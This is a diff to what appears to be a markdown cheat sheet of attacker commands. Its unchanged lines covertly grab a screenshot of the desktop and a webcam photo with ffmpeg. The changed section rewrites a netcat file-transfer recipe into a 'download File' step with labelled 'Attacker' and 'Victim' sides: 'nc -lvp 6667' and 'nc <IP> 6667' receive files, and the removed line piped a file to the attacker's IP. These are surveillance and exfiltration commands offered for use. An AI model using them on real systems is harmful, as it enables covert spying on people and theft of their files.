@@ -38,10 +38,14 @@ ffmpeg -f x11grab -framerate 1 -i :0.0 -vframes 1 screenshot.jpg
 ffmpeg -f video4linux2 -s 640x480 -i /dev/video0 -ss 0:0:1 -frames 1 /tmp/selfie.jpg
 ```
 
-## Send File
+## download File
+Attacker:
 ```
-nc -lvp 6667 > out
+nc -lvp 6667 > sus_text.txt
+OR
+nc <IP> 6667 > sus_text.txt
 ```
+Victim:
 ```
-cat <file> | nc <IP> 6667
+[Honigkuchenpferd /home/Doofy/Dokumente/sus_stuff] download sus_text.txt
 ```
